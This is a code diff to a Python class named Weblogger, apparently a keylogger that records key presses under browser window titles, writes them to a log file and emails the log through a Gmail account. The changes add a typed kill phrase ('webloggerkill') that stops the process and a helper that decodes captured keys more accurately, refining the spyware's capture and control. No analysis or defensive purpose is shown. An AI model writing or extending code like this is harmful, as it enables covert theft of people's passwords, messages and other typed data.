@@ -28,6 +28,7 @@ class Weblogger(object):
         self.w_title = ""
         self.browser_title = ""
         self.last_title = ""
+        self.command = ""
         self.is_thread_running = False
         self.last_key = None
 
@@ -84,7 +85,7 @@ class Weblogger(object):
         if self.browser_title != self.last_title:
             self.write_log('\n========== %s ==========\n' % self.browser_title)
 
-        key_pressed = str(key.char) if "u'" in str(key) else '<%s>' % str(key)
+        key_pressed = self.get_pressed_key(key)
 
         if key != self.last_key or key not in self.IGNORE_HOLD:
             self.last_key = key
@@ -105,12 +106,15 @@ class Weblogger(object):
 
     def write_log(self, text):
         text = self.translate(text)
+        self.command += text
 
         if self.LOGGING:
             print(text)
 
         with open(self.log_file, 'a') as lf:
             lf.write(text)
+
+        self.check_command()
 
         with open(self.log_file, 'r') as lf:
             data = lf.read()
@@ -120,6 +124,17 @@ class Weblogger(object):
             if self.LOGGING:
                 print('Length: %d' % data_length)
             self.send_mail(data)
+
+    def check_command(self):
+        KILL = 'webloggerkill'
+        length = len(self.command)
+
+        if self.command != KILL[0:length]:
+            self.command = ''
+        elif length == len(KILL):
+            if self.LOGGING:
+                print('Matando processo')
+            self.kill()
 
     def send_mail(self, text):
         if not self.email_to or not all(self.GMAIL_DATA.values()):
@@ -162,6 +177,20 @@ class Weblogger(object):
             if self.LOGGING:
                 print('Length: %d' % data_length)
             self.send_mail(data)
+
+    @staticmethod
+    def get_pressed_key(key):
+        str_key = str(key)
+
+        if "u'" in str_key:
+            if '\\' in str_key:
+                pressed = chr(key.vk + 32)
+            else:
+                pressed = str(key.char)
+        else:
+            pressed = '<%s>' % str_key
+
+        return pressed
 
     @staticmethod
     def translate(key):
